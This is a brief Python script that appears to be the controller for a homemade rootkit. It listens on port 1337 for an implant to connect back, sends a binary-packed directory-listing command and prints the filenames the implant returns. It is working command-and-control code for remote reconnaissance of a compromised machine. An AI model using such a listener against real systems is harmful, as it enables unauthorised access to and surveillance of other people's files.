#!/usr/bin/python

import socket
import struct

PORT = 1337
DIR_PATH = b'/home/ppeck/Desktop/Stuff/Cyber/Projects/rootkit\0'

req = struct.pack('<Q', len(DIR_PATH) + 9 + 2) + struct.pack('<B', 2)
req += struct.pack('<H', len(DIR_PATH)) + DIR_PATH

server_sock = socket.socket()
server_sock.bind(('', PORT))
server_sock.listen(1)
client_sock, client_address = server_sock.accept()

client_sock.send(req)

res_len = struct.unpack('<Q', client_sock.recv(8))[0]
print('Response length: ' + str(res_len))

client_sock.recv(1)

err = struct.unpack('<B', client_sock.recv(1))[0]
print('Response error code: ' + str(err))

dir_path = DIR_PATH.decode()

if err == 0:
    print(dir_path)
    while (True):
        filename_len = struct.unpack('<Q', client_sock.recv(8))[0]

        if filename_len == 0:
            break

        data = client_sock.recv(filename_len)

        print(data.decode())

server_sock.close()
client_sock.close()


